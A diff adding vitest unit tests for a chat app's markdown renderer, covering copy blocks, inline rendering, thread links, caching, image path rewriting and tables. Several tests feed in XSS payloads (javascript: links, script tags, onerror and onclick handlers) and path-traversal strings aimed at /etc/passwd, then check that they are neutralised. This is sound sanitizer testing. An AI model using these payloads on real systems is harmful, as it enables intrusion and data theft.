+  | { type: 'form'; form: InlineForm }
+  | { type: 'skill-ui'; skill: Skill; component: SkillUiComponent }
+  | { type: 'file-preview'; path: string }
+  | { type: 'url-preview'; url: string }
+  | { type: 'notification-detail'; notification: Notification }
+  | null;
+
+Key files to change:
+- store/store.ts — replace 6 signals with one panelOverlay signal
+- store/actions/menu.ts — clearing becomes panelOverlay.value = null
+- store/actions/navigation.ts — NavEntry stores one overlay value instead of 6 fields
+- store/actions/skills.ts — openSkill(), openSkillUi(), closeSkillWindow() set/clear the union
+- store/actions/artifacts.ts — openUrl(), file preview setters
+- store/actions/notifications.ts — viewNotification()
+- components/layout/ContentPane.tsx — replace priority chain with switch on overlay.type
+- components/layout/AppHeader.tsx — reads overlay to determine header title
+- ~25 files total touch these signals
+
+Constraints:
+- Write integration tests BEFORE refactoring
+- Migrate the existing menu.test.ts tests to use the new union
+- Navigation save/restore in localStorage must remain backward-compatible
+- npm test and npx tsc --noEmit must pass with zero errors`;
+      const html = renderMarkdown(`<copy>${content}</copy>`);
+
+      // The copy-btn must contain the SVG — not be broken out of its wrapper
+      expect(html).toContain('class="copy-btn"');
+      expect(html).toContain('copyable-block-multi');
+
+      // The SVG must be INSIDE the button, not floating loose
+      const btnStart = html.indexOf('class="copy-btn"');
+      const svgStart = html.indexOf('<svg');
+      const btnEnd = html.indexOf('</button>');
+      expect(btnStart).toBeGreaterThan(-1);
+      expect(svgStart).toBeGreaterThan(btnStart);
+      expect(btnEnd).toBeGreaterThan(svgStart);
+
+      // Content must be visible (not swallowed by broken HTML)
+      expect(html).toContain('Refactor panel overlay');
+      expect(html).toContain('Key files to change');
+
+      // No loose SVGs outside of button wrappers
+      const svgCount = (html.match(/<svg/g) || []).length;
+      const btnSvgCount = (html.match(/class="copy-btn"[^>]*>[\s]*<svg/g) || []).length;
+      expect(svgCount).toBe(btnSvgCount);
+    });
+
+    it('multiline copy block with markdown headings and code fences survives marked', () => {
+      // Regression: marked's HTML block rules end a <div> at the first blank line.
+      // A multiline copy block wrapping markdown content (headings, code fences)
+      // gets its wrapper div broken — the copy button ends up orphaned.
+      const content = `# Advanced Prompt
+
+Here is an example:
+
+\`\`\`rust
+fn main() {
+    println!("hello");
+}
+\`\`\`
+
+Use this pattern for all prompts.`;
+
+      const html = renderMarkdown(`<copy>${content}</copy>`);
+
+      // The wrapper div must contain the copy button
+      expect(html).toContain('copyable-block-multi');
+
+      // The copy button must exist and contain the SVG
+      const btnMatch = html.match(/<button[^>]*class="copy-btn"[^>]*>[\s\S]*?<\/button>/);
+      expect(btnMatch).not.toBeNull();
+
+      // The wrapper div must close AFTER the button, not before the content
+      const wrapperStart = html.indexOf('copyable-block-multi');
+      const btnPos = html.indexOf('class="copy-btn"');
+      expect(wrapperStart).toBeGreaterThan(-1);
+      expect(btnPos).toBeGreaterThan(wrapperStart);
+
+      // Content must be rendered as markdown inside the wrapper
+      expect(html).toContain('<h1');
+      expect(html).toContain('Advanced Prompt');
+      expect(html).toContain('println!');
+
+      // data-copy-text must contain the raw text for clipboard
+      expect(html).toContain('data-copy-text=');
+    });
+
+    it('does not match <copy> tags inside backtick code spans', () => {
+      // When the LLM writes `<copy>` (backtick-quoted tag reference),
+      // the preprocessor must not treat it as a real copy block start.
+      const html = renderMarkdown('I understand the `<copy>` syntax.\n\n<copy>actual content</copy>');
+
+      // The backtick-quoted <copy> must render as inline code, not trigger a copy block
+      expect(html).toContain('<code>&lt;copy&gt;</code>');
+
+      // The real copy block must still work
+      expect(html).toContain('copyable-block');
+      expect(html).toContain('actual content');
+
+      // No orphaned backticks
+      expect(html).not.toMatch(/I understand the `<br/);
+    });
+
+    it('does not match <copy> tags inside fenced code blocks', () => {
+      const html = renderMarkdown('```\n<copy>not real</copy>\n```\n\n<copy>real</copy>');
+
+      // Only one copy block (the real one), not the one inside the code fence
+      const copyBlocks = html.match(/copyable-block/g);
+      expect(copyBlocks).not.toBeNull();
+      expect(copyBlocks!.length).toBe(1);
+
+      // The fenced one should render as code
+      expect(html).toContain('code-block-wrapper');
+    });
+
+    it('preserves inline code backticks in data-copy-text', () => {
+      const html = renderMarkdown('Currently, <copy>`getTextContent()` only returns text content.</copy>');
+      // data-copy-text must contain the backtick-wrapped code, not a placeholder
+      expect(html).toContain('data-copy-text="`getTextContent()` only returns text content."');
+      expect(html).not.toContain('CODE');
+    });
+
+    it('preserves inline code in multiline copy block data-copy-text', () => {
+      const html = renderMarkdown('<copy>Run `npm install`\nthen `npm start`</copy>');
+      expect(html).toContain('data-copy-text="Run `npm install`\nthen `npm start`"');
+      expect(html).not.toContain('CODE');
+    });
+
+    it('handles multiple copy blocks in one message', () => {
+      const html = renderMarkdown('ID: <copy>abc</copy> and <copy>xyz</copy>');
+      const matches = html.match(/copyable-block/g);
+      // Each block has the class once in the element, so at least 2
+      expect(matches!.length).toBeGreaterThanOrEqual(2);
+    });
+  });
+
+  describe('renderMarkdownInline (phrasing-content-only)', () => {
+    it('renders inline tokens — bold, italic, code, breaks', () => {
+      const html = renderMarkdownInline('**bold** *it* `code` line\nbreak');
+      expect(html).toContain('<strong>bold</strong>');
+      expect(html).toContain('<em>it</em>');
+      expect(html).toContain('<code>code</code>');
+      expect(html).toContain('<br');
+    });
+
+    it('does NOT emit block elements — paragraphs, lists, headings stay as literal text', () => {
+      // The whole point: the output must be safe to nest inside <button> /
+      // <span>, so block markdown is left as-is rather than wrapped in
+      // <p>/<ul>/<h*>. Otherwise we'd reintroduce the HTML-validity bug the
+      // helper exists to avoid.
+      const html = renderMarkdownInline('# heading\n- item one\n- item two');
+      expect(html).not.toContain('<p>');
+      expect(html).not.toContain('<ul>');
+      expect(html).not.toContain('<li>');
+      expect(html).not.toContain('<h1');
+      // Dashes survive as visual bullets, content is preserved.
+      expect(html).toContain('# heading');
+      expect(html).toContain('- item one');
+      expect(html).toContain('- item two');
+    });
+
+    it('strips <a> from markdown links but keeps the label text', () => {
+      // <a> is interactive content; inside the AskUserQuestion option <button>
+      // that's interactive-in-interactive (HTML spec violation). The renderer
+      // returns label text only.
+      const html = renderMarkdownInline('see [docs](https://example.com) for more');
+      expect(html).not.toContain('<a ');
+      expect(html).not.toContain('href');
+      expect(html).toContain('see docs for more');
+    });
+
+    it('preserves nested inline markdown inside link text after stripping', () => {
+      // Without parser.parseInline on the link's child tokens, **bold** inside
+      // link text would survive as literal asterisks instead of <strong>.
+      const html = renderMarkdownInline('[**bold link**](https://x)');
+      expect(html).toContain('<strong>bold link</strong>');
+      expect(html).not.toContain('<a ');
+    });
+
+    it('discards javascript:-scheme link targets along with the wrapper', () => {
+      // Bonus property of dropping the href: dangerous URL schemes never reach
+      // the DOM. The label text survives, the target does not.
+      const html = renderMarkdownInline('[click me](javascript:alert(1))');
+      expect(html).toContain('click me');
+      expect(html).not.toContain('javascript:');
+      expect(html).not.toContain('<a ');
+    });
+
+    it('still escapes dangerous tags from raw source', () => {
+      const html = renderMarkdownInline('try <script>x</script> here');
+      expect(html).not.toContain('<script>');
+      expect(html).toContain('&lt;script&gt;');
+    });
+
+    it('strips raw inline HTML event handlers', () => {
+      const html = renderMarkdownInline('<span onclick="alert(1)">tap</span>');
+      expect(html).toContain('<span>tap</span>');
+      expect(html).not.toContain('onclick');
+      expect(html).not.toContain('alert(1)');
+    });
+
+    it('handles empty input', () => {
+      expect(renderMarkdownInline('')).toBe('');
+    });
+
+    // The link renderer sees only markdown links. Raw HTML in an agent's
+    // option preview put a live control inside the option <button>. A tap
+    // meant to answer could then navigate the app away.
+    it('unwraps raw interactive HTML, keeping its text', () => {
+      const html = renderMarkdownInline(
+        'a <a href="https://example.com">link</a>, a <button>button</button>, <input value="x"> end',
+      );
+      expect(html).toContain('a link, a button,');
+      expect(html).toContain('end');
+      expect(html).not.toMatch(/<(a|button|input)\b/);
+    });
+  });
+
+  describe('thread reference links', () => {
+    // No <base> stamped in tests → WORKSPACE_ID null → served-directly fallback.
+    beforeEach(() => {
+      base.workspaceId = null;
+    });
+
+    it('rewrites bare-UUID thread links into clickable thread chips', () => {
+      const html = renderMarkdown('See [the bug](thread:1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff)');
+      expect(html).toContain('class="thread-link"');
+      expect(html).toContain('data-thread-id="1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff"');
+      expect(html).not.toContain('href="thread:');
+      expect(html).not.toContain('data-thread-workspace');
+    });
+
+    it('rewrites workspace-qualified thread links and preserves the workspace', () => {
+      const html = renderMarkdown('See [the bug](thread:dev/1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff)');
+      expect(html).toContain('class="thread-link"');
+      expect(html).toContain('data-thread-id="1c2419a1-aaaa-bbbb-cccc-ddddeeeeffff"');
+      expect(html).toContain('data-thread-workspace="dev"');
+      expect(html).not.toContain('href="thread:');
+    });
+
+    it('uses href="#" when not served behind the gateway (no workspace slug)', () => {
+      const html = renderMarkdown('See [it](thread:0a11aaaa-bbbb-cccc-dddd-eeeeffff0009)');
+      expect(html).toContain('href="#"');
+      expect(html).toContain('class="thread-link"');
+    });
+  });
+
+  describe('thread reference links — behind the gateway', () => {
+    // Served at https://<gateway>/myws/ → hover should show the real
+    // destination, not the `#`-resolves-to-current-page URL.
+    beforeEach(() => {
+      base.workspaceId = 'myws';
+      vi.stubGlobal('location', { origin: 'https://localhost:5251' });
+    });
+    afterEach(() => {
+      vi.unstubAllGlobals();
+      base.workspaceId = null;
+    });
+
+    it('points an untagged (same-workspace) link at the current workspace slug', () => {
+      const html = renderMarkdown('See [the bug](thread:aa11aaaa-bbbb-cccc-dddd-eeeeffff0001)');
+      expect(html).toContain('href="https://localhost:5251/myws/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0001"');
+      expect(html).toContain('class="thread-link"');
+    });
+
+    it('points a cross-workspace link at the target workspace slug', () => {
+      const html = renderMarkdown('See [the bug](thread:dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0002)');
+      expect(html).toContain('href="https://localhost:5251/dev/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0002"');
+      expect(html).toContain('data-thread-workspace="dev"');
+    });
+
+    it('slugifies the ref workspace name for the href (lowercased)', () => {
+      const html = renderMarkdown('See [the bug](thread:Dev/aa11aaaa-bbbb-cccc-dddd-eeeeffff0003)');
+      expect(html).toContain('href="https://localhost:5251/dev/#thread=aa11aaaa-bbbb-cccc-dddd-eeeeffff0003"');
+      // raw (un-slugified) workspace name is preserved for the click handler
+      expect(html).toContain('data-thread-workspace="Dev"');
+    });
+  });
+
+  // Regression guard for the "heavy thread freezes on send" fix: re-rendering a
+  // thread re-calls renderMarkdown for every block; without caching, each
+  // re-render re-parsed all of them (the markdown re-parse storm). The cache
+  // makes a repeated input an O(1) lookup; the live streaming buffer opts out.
+  describe('parse caching', () => {
+    it('caches by input so a repeated render does not re-parse', () => {
+      const spy = vi.spyOn(marked, 'parse');
+      const md = '**cache-hit-unique-marker-alpha** with `code` and a list\n- one\n- two';
+      const before = spy.mock.calls.length;
+      const a = renderMarkdown(md);
+      const b = renderMarkdown(md);
+      expect(b).toBe(a);
+      expect(spy.mock.calls.length).toBe(before + 1); // parsed once; second was a cache hit
+      spy.mockRestore();
+    });
+
+    it('cache:false bypasses the cache (streaming buffer never pollutes it)', () => {
+      const spy = vi.spyOn(marked, 'parse');
+      const md = '**cache-bypass-unique-marker-beta** streaming fragment';
+      const before = spy.mock.calls.length;
+      renderMarkdown(md, { cache: false });
+      renderMarkdown(md, { cache: false });
+      expect(spy.mock.calls.length).toBe(before + 2); // re-parsed both times, not cached
+      spy.mockRestore();
+    });
+  });
+});
+
+/**
+ * Images. Two things happen to an `<img>` the block renderer emits: a
+ * workspace-relative `src` is resolved against the mount that actually serves
+ * the file, and the tag is wrapped in the `.image-scroll-wrapper` scroll
+ * container. The URL is built by the SDK's `lucidos.data.url`, so these tests
+ * drive the served context the way the browser supplies it: `configure({
+ * baseUrl })` for the gateway's `/<slug>` prefix (absent on a bare engine port)
+ * plus a stubbed `location`, since the SDK reads `window.location` to tell an
+ * app iframe from the host shell.
+ *
+ * `cache: false` throughout, because renderMarkdown memoizes by input text
+ * alone: two served contexts rendering the same markdown would otherwise share
+ * one result.
+ */
+describe('renderMarkdown images', () => {
+  const servedAt = (baseUrl: string, pathname: string) => {
+    lucidos.configure({ baseUrl });
+    vi.stubGlobal('location', { origin: 'https://localhost:5251', pathname, search: '' });
+  };
+  const imgSrc = (html: string) => html.match(/<img[^>]*\ssrc="([^"]*)"/)?.[1];
+
+  beforeEach(() => {
+    base.workspaceId = 'myws';
+    servedAt('/myws', '/myws/');
+  });
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+    lucidos.configure({ baseUrl: '' });
+    base.workspaceId = null;
+  });
+
+  it('resolves a workspace-relative source through the data mount', () => {
+    const html = renderMarkdown('![right aligned](artifacts/screenshots/hero.png)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/screenshots/hero.png');
+  });
+
+  it('carries no workspace prefix when served directly on an engine port', () => {
+    base.workspaceId = null;
+    servedAt('', '/');
+    const html = renderMarkdown('![alt](artifacts/screenshots/hero.png)', { cache: false });
+    expect(imgSrc(html)).toBe('/data/artifacts/screenshots/hero.png');
+  });
+
+  it('resolves the other workspace directories the same way', () => {
+    for (const dir of ['apps', 'knowhow', 'triggers']) {
+      const html = renderMarkdown(`![alt](${dir}/thing/logo.png)`, { cache: false });
+      expect(imgSrc(html)).toBe(`/myws/data/${dir}/thing/logo.png`);
+    }
+  });
+
+  it('routes system-knowhow through the API endpoint, not the static mount', () => {
+    // system-knowhow ships with the engine rather than living in the workspace,
+    // so it is not under the static /data mount. Deferring to the SDK's builder
+    // is what gets this right without renderMarkdown knowing about the case.
+    const html = renderMarkdown('![diagram](system-knowhow/diagram.png)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/api/v1/data/system-knowhow/diagram.png');
+  });
+
+  it('encodes a source exactly once', () => {
+    // marked percent-encodes the src it emits and the SDK encodes each segment
+    // again, so a non-ASCII name would round-trip to `%C3%83%C2%A6…` and 404.
+    const html = renderMarkdown('![alt](artifacts/æøå.png)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/%C3%A6%C3%B8%C3%A5.png');
+  });
+
+  it('leaves an absolute URL untouched, but still wraps it', () => {
+    const html = renderMarkdown('![alt](https://example.com/x.png)', { cache: false });
+    expect(imgSrc(html)).toBe('https://example.com/x.png');
+    expect(html).toContain('<span class="image-scroll-wrapper">');
+  });
+
+  it('leaves an already-absolute site path untouched', () => {
+    const html = renderMarkdown('![alt](/already/absolute.png)', { cache: false });
+    expect(imgSrc(html)).toBe('/already/absolute.png');
+  });
+
+  it('leaves a protocol-relative source untouched', () => {
+    const html = renderMarkdown('![alt](//cdn.example.com/x.png)', { cache: false });
+    expect(imgSrc(html)).toBe('//cdn.example.com/x.png');
+  });
+
+  it('leaves a relative path outside the workspace allowlist alone', () => {
+    // The rule is an allowlist of workspace top-level directories rather than
+    // "every relative path", so a relative asset path that means something else
+    // in its own context is never silently redirected at the workspace.
+    const html = renderMarkdown('![alt](foo/bar.png)', { cache: false });
+    expect(imgSrc(html)).toBe('foo/bar.png');
+  });
+
+  it('refuses a source that walks out of the workspace', () => {
+    const html = renderMarkdown('![alt](artifacts/../../etc/passwd)', { cache: false });
+    expect(imgSrc(html)).toBe('artifacts/../../etc/passwd');
+    expect(html).not.toContain('/data/');
+  });
+
+  it('refuses a percent-encoded traversal too', () => {
+    const html = renderMarkdown('![alt](artifacts/%2e%2e/%2e%2e/etc/passwd)', { cache: false });
+    expect(imgSrc(html)).toBe('artifacts/%2e%2e/%2e%2e/etc/passwd');
+    expect(html).not.toContain('/data/');
+  });
+
+  it('refuses a traversal hidden behind an encoded separator', () => {
+    // `%2e%2e%2f%2e%2e` decodes to a SINGLE segment reading `../..`, which a
+    // check on the pre-join segments would wave through. The path encoder then
+    // splits it back into two real segments (a dot is unreserved, so nothing
+    // re-escapes them) and the browser normalizes the request out of the mount.
+    const html = renderMarkdown('![alt](artifacts/%2e%2e%2f%2e%2e/api/v1/health)', { cache: false });
+    expect(imgSrc(html)).toBe('artifacts/%2e%2e%2f%2e%2e/api/v1/health');
+    expect(html).not.toContain('/data/');
+  });
+
+  it('keeps a query string a query rather than folding it into the file name', () => {
+    const html = renderMarkdown('![alt](artifacts/x.png?v=2)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png?v=2');
+  });
+
+  it('does not re-escape an ampersand the author already escaped', () => {
+    // The query is carried over verbatim from an attribute value that is
+    // already escaped. Escaping it a second time would send the server the
+    // literal text `&amp;` as a parameter name.
+    const html = renderMarkdown('![alt](artifacts/x.png?a=1&amp;b=2)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png?a=1&amp;b=2');
+    expect(html).not.toContain('&amp;amp;');
+  });
+
+  it('keeps a fragment attached after the path', () => {
+    const html = renderMarkdown('![alt](artifacts/chart.svg#detail)', { cache: false });
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/chart.svg#detail');
+  });
+
+  /** A previewed file names its images relative to its own folder, the way
+   *  GitHub and every editor read them. */
+  describe('in a repository document', () => {
+    const doc = (path: string, rev: { ref?: string; changeId?: string } = {}) =>
+      ({ kind: 'repo', repoId: 'repo-1', path, ...rev }) as const;
+    const render = (md: string, document: ReturnType<typeof doc>) =>
+      renderMarkdown(md, { cache: false, document });
+    const fileUrl = (path: string, ref?: string) => {
+      const params = new URLSearchParams({ path });
+      if (ref) params.set('ref', ref);
+      return `/myws/api/v1/repositories/repo-1/file?${params}`.replace(/&/g, '&amp;');
+    };
+    const imgOf = (html: string) =>
+      new DOMParser().parseFromString(html, 'text/html').querySelector('img')!;
+
+    it('resolves an image against the document folder', () => {
+      const html = render('![LLM call flow](images/guide/llm-call-flow.png)', doc('docs/guide.md'));
+      expect(imgSrc(html)).toBe(fileUrl('docs/images/guide/llm-call-flow.png'));
+    });
+
+    it('resolves a raw HTML image the same way', () => {
+      const html = render('<img src="assets/banner.png" alt="Project banner">', doc('README.md'));
+      expect(imgSrc(html)).toBe(fileUrl('assets/banner.png'));
+    });
+
+    it('follows a ../ that stays inside the checkout', () => {
+      const html = render('![x](../assets/logo.png)', doc('docs/guide/setup.md'));
+      expect(imgSrc(html)).toBe(fileUrl('docs/assets/logo.png'));
+    });
+
+    it('anchors a leading slash at the checkout root', () => {
+      const html = render('![x](/assets/logo.png)', doc('docs/guide/setup.md'));
+      expect(imgSrc(html)).toBe(fileUrl('assets/logo.png'));
+    });
+
+    it('carries the branch the document was read at', () => {
+      const html = render('![x](img/a.png)', doc('docs/x.md', { ref: 'feature/images' }));
+      expect(imgSrc(html)).toBe(fileUrl('docs/img/a.png', 'feature/images'));
+    });
+
+    it('reads the image from the change a whole-file view shows', () => {
+      const html = render('![x](img/a.png)', doc('docs/x.md', { changeId: 'change-9', ref: 'branch' }));
+      expect(imgSrc(html)).toBe('/myws/api/v1/changes/change-9/file?path=docs%2Fimg%2Fa.png');
+    });
+
+    it('drops a query the file URL has no use for', () => {
+      const html = render('![x](img/a.png?raw=true)', doc('README.md'));
+      expect(imgSrc(html)).toBe(fileUrl('img/a.png'));
+    });
+
+    it('decodes before resolving, so a space is encoded once', () => {
+      const html = render('![x](<my pics/a b.png>)', doc('README.md'));
+      expect(imgSrc(html)).toBe(fileUrl('my pics/a b.png'));
+    });
+
+    it('leaves an absolute URL alone', () => {
+      const html = render('![x](https://example.com/x.png)', doc('README.md'));
+      expect(imgSrc(html)).toBe('https://example.com/x.png');
+    });
+
+    it('refuses a ../ that climbs out of the checkout, and never fetches it', () => {
+      const html = render(
+        '![chunk split](../../../crates/lucidos-app/x.png)',
+        doc('docs/plans/2026-09-26-entry-chunk-first-paint-split.md'),
+      );
+      const img = imgOf(html);
+      expect(img.hasAttribute('src')).toBe(false);
+      expect(img.hasAttribute('data-load-failed')).toBe(true);
+      expect(html).toContain('Image not available: chunk split');
+      expect(html).toContain('<code>../../../crates/lucidos-app/x.png</code>');
+      // The notice sits in the image's own wrapper, where a failed load puts it.
+      expect(img.parentElement?.className).toBe('image-scroll-wrapper');
+    });
+
+    it('refuses an encoded climb, however it is spelled', () => {
+      for (const src of ['%2e%2e/%2e%2e/x.png', 'a/%2e%2e%2f%2e%2e%2f..%2fx.png', '..%5c..%5cx.png']) {
+        expect(imgOf(render(`<img src="${src}">`, doc('docs/x.md'))).hasAttribute('src')).toBe(false);
+      }
+    });
+
+    it('refuses a malformed escape rather than guessing', () => {
+      expect(imgOf(render('<img src="img/%zz.png">', doc('docs/x.md'))).hasAttribute('src')).toBe(false);
+    });
+  });
+
+  describe('in a workspace document', () => {
+    const doc = { kind: 'workspace', path: 'artifacts/reports/weekly.md' } as const;
+    const render = (md: string) => renderMarkdown(md, { cache: false, document: doc });
+
+    it('keeps a source naming a workspace directory root-relative', () => {
+      expect(imgSrc(render('![x](artifacts/screenshots/hero.png)'))).toBe('/myws/data/artifacts/screenshots/hero.png');
+    });
+
+    it('resolves a sibling and a ../ against the document folder', () => {
+      expect(imgSrc(render('![x](pic.png)'))).toBe('/myws/data/artifacts/reports/pic.png');
+      expect(imgSrc(render('![x](./charts/a.png?v=2)'))).toBe('/myws/data/artifacts/reports/charts/a.png?v=2');
+      expect(imgSrc(render('![x](../img/pic.png)'))).toBe('/myws/data/artifacts/img/pic.png');
+    });
+
+    it('refuses a source that climbs out of the data root', () => {
+      const html = render('![x](../../../etc/passwd)');
+      expect(html).not.toContain('/data/');
+      expect(html).toContain('data-load-failed');
+    });
+
+    it('refuses a climb that starts at a workspace directory', () => {
+      expect(render('![x](artifacts/../../etc/passwd)')).toContain('data-load-failed');
+    });
+  });
+
+  /** A size hint lets the browser reserve the picture's box before its bytes
+   *  arrive, so a card or reply does not grow when it loads. */
+  describe('size hint', () => {
+    const imgOf = (html: string) =>
+      new DOMParser().parseFromString(html, 'text/html').querySelector('img')!;
+
+    it('stamps the size and strips the hint from the served source', () => {
+      const img = imgOf(renderMarkdown('![alt](artifacts/x.png#1600x1200)', { cache: false }));
+      expect(img.getAttribute('src')).toBe('/myws/data/artifacts/x.png');
+      expect(img.getAttribute('data-size-hint')).toBe('');
+      expect(img.getAttribute('style')).toBe('--hint-w: 1600; --hint-h: 1200;');
+    });
+
+    it('stamps a hinted absolute URL too', () => {
+      const img = imgOf(renderMarkdown('![alt](https://example.com/x.png#40x30)', { cache: false }));
+      expect(img.getAttribute('src')).toBe('https://example.com/x.png');
+      expect(img.hasAttribute('data-size-hint')).toBe(true);
+    });
+
+    it('stamps the inline variant a question option renders', () => {
+      const img = imgOf(renderMarkdownInline('![alt](artifacts/x.png#800x600)'));
+      expect(img.getAttribute('src')).toBe('/myws/data/artifacts/x.png');
+      expect(img.getAttribute('style')).toBe('--hint-w: 800; --hint-h: 600;');
+    });
+
+    it('keeps an inline style the author gave a raw image', () => {
+      const img = imgOf(renderMarkdown('<img style="opacity: 0.5" src="artifacts/x.png#40x30">', { cache: false }));
+      expect(img.style.getPropertyValue('opacity')).toBe('0.5');
+      expect(img.style.getPropertyValue('--hint-w')).toBe('40');
+    });
+
+    it('leaves an unhinted image unstamped', () => {
+      const img = imgOf(renderMarkdown('![alt](artifacts/x.png)', { cache: false }));
+      expect(img.hasAttribute('data-size-hint')).toBe(false);
+      expect(img.hasAttribute('style')).toBe(false);
+    });
+
+    it('treats any other fragment as the author\'s own', () => {
+      for (const src of ['artifacts/x.svg#detail', 'artifacts/x.png#0x10', 'artifacts/x.png#10x']) {
+        const img = imgOf(renderMarkdown(`![alt](${src})`, { cache: false }));
+        expect(img.hasAttribute('data-size-hint'), src).toBe(false);
+        expect(img.getAttribute('src'), src).toBe(`/myws/data/${src}`);
+      }
+    });
+  });
+
+  it('still strips a data: image URI, exactly as before the rewrite existed', () => {
+    const html = renderMarkdown('![alt](data:image/png;base64,AAAA)', { cache: false });
+    expect(html).not.toContain('data:image/png');
+    expect(html).toContain('<img alt="alt">');
+  });
+
+  it('wraps the image in the scroll container with the rewrite applied inside it', () => {
+    const html = renderMarkdown('![right aligned](artifacts/screenshots/hero.png)', { cache: false });
+    expect(html).toContain(
+      '<span class="image-scroll-wrapper">'
+      + '<img src="/myws/data/artifacts/screenshots/hero.png" alt="right aligned">'
+      + '</span>',
+    );
+  });
+
+  it('gives two images in one document a wrapper each', () => {
+    const html = renderMarkdown('![a](artifacts/one.png)\n\n![b](artifacts/two.png)', { cache: false });
+    expect(html.match(/<span class="image-scroll-wrapper">/g)).toHaveLength(2);
+    expect(html).toContain('src="/myws/data/artifacts/one.png"');
+    expect(html).toContain('src="/myws/data/artifacts/two.png"');
+  });
+
+  /** The wrapper is spliced around the tag. So a pass that mistakes the three
+   *  characters `<img` inside an attribute value for a real tag splices INTO
+   *  that value. The literal carries quotes, which closed the `title` and let
+   *  a real `<img onerror>` out into element position, past the sanitizer. */
+  it('wraps no image for an <img written inside an attribute value', () => {
+    const html = renderMarkdown(
+      '<a href="#" title="<img src=x onerror=alert(1)>">hi</a>',
+      { cache: false },
+    );
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    expect(doc.querySelector('img')).toBeNull();
+    expect(doc.querySelector('.image-scroll-wrapper')).toBeNull();
+    // The text stays text on the anchor that always owned it.
+    expect(doc.querySelector('a')!.getAttribute('title'))
+      .toBe('<img src=x onerror=alert(1)>');
+  });
+
+  it('leaves the anchor structure of a linked image intact', () => {
+    const html = renderMarkdown('[![alt](artifacts/x.png)](https://example.com)', { cache: false });
+    expect(html).toContain(
+      '<a href="https://example.com">'
+      + '<span class="image-scroll-wrapper"><img src="/myws/data/artifacts/x.png" alt="alt"></span>'
+      + '</a>',
+    );
+  });
+
+  it('rewrites AND wraps an inline-variant image, like a reply image', () => {
+    // A question card showed an agent's mockups shrunk to the card's width,
+    // with no sideways scroll and no tap to open them. The wrapper is a
+    // `<span>`, so the output stays phrasing content a <button> may hold.
+    const html = renderMarkdownInline('see ![alt](artifacts/x.png) here');
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
+    expect(html).toContain(
+      '<span class="image-scroll-wrapper"><img src="/myws/data/artifacts/x.png" alt="alt"></span>',
+    );
+  });
+
+  it('transforms a table and an image in the same document without corrupting either', () => {
+    const md = [
+      '| A | B | C | D |',
+      '| --- | --- | --- | --- |',
+      '| w | x | y | z |',
+      '',
+      '![alt](artifacts/x.png)',
+    ].join('\n');
+    const html = renderMarkdown(md, { cache: false });
+    expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
+    expect(html).toContain('<td data-label="A">w</td>');
+    expect(html).toContain('<span class="image-scroll-wrapper">');
+    expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
+  });
+
+  it('wraps and rewrites an image sitting inside a table cell', () => {
+    const md = ['| A | B |', '| --- | --- |', '| ![alt](artifacts/x.png) | y |'].join('\n');
+    const html = renderMarkdown(md, { cache: false });
+    expect(html).toContain('<div class="table-scroll-wrapper"><table>');
+    expect(html).toContain(
+      '<td><span class="image-scroll-wrapper">'
+      + '<img src="/myws/data/artifacts/x.png" alt="alt">'
+      + '</span></td>',
+    );
+  });
+});
+
+/**
+ * Tables. Two properties are pinned here; the third (that a column is never
+ * laid out narrower than its longest word) is a LAYOUT property with no
+ * observable in this suite, since vitest runs against the stub `document` in
+ * test-setup.ts with no layout engine. It lives in
+ * e2e/markdown-table-columns.spec.ts instead.
+ */
+describe('renderMarkdown tables', () => {
+  const mdRow = (cells: string[]) => `| ${cells.join(' | ')} |`;
+  const mdTable = (headers: string[], ...rows: string[][]) =>
+    [mdRow(headers), mdRow(headers.map(() => '---')), ...rows.map(mdRow)].join('\n');
+  const labels = (html: string) =>
+    [...html.matchAll(/data-label="([^"]*)"/g)].map((m) => m[1]);
+
+  it('keeps the grid below the stack threshold', () => {
+    for (const cols of [2, 3]) {
+      const headers = Array.from({ length: cols }, (_, i) => `H${i}`);
+      const html = renderMarkdown(mdTable(headers, headers.map((_, i) => `v${i}`)));
+      expect(html).toContain('<div class="table-scroll-wrapper"><table>');
+      expect(html).not.toContain('data-stack');
+      expect(html).not.toContain('data-label');
+    }
+  });
+
+  it('stacks at and above the threshold, labelling every cell', () => {
+    for (const cols of [4, 5]) {
+      const headers = Array.from({ length: cols }, (_, i) => `H${i}`);
+      const html = renderMarkdown(mdTable(headers, headers.map((_, i) => `v${i}`)));
+      expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
+      expect(html).toContain('</table></div>');
+      expect(labels(html)).toEqual(headers);
+    }
+  });
+
+  it('restarts the labels on every row', () => {
+    const html = renderMarkdown(
+      mdTable(['A', 'B', 'C', 'D'], ['1', '2', '3', '4'], ['5', '6', '7', '8'])
+    );
+    expect(labels(html)).toEqual(['A', 'B', 'C', 'D', 'A', 'B', 'C', 'D']);
+  });
+
+  it('pairs each label with its own cell, not the next one', () => {
+    const html = renderMarkdown(mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']));
+    expect(html).toContain('<td data-label="A">w</td>');
+    expect(html).toContain('<td data-label="D">z</td>');
+  });
+
+  it('keeps alignment attributes marked emits on a cell', () => {
+    const md = [
+      '| A | B | C | D |',
+      '| :-- | :-: | --: | --- |',
+      '| w | x | y | z |',
+    ].join('\n');
+    const html = renderMarkdown(md);
+    expect(html).toContain('<td align="center" data-label="B">x</td>');
+  });
+
+  it('escapes a header so it cannot break out of the attribute', () => {
+    const html = renderMarkdown(mdTable(['a"b', 'A & B', 'C', 'D'], ['w', 'x', 'y', 'z']));
+    expect(html).toContain('data-label="a&quot;b"');
+    // Single-escaped: a double escape would render the literal text "&amp;".
+    expect(html).toContain('data-label="A &amp; B"');
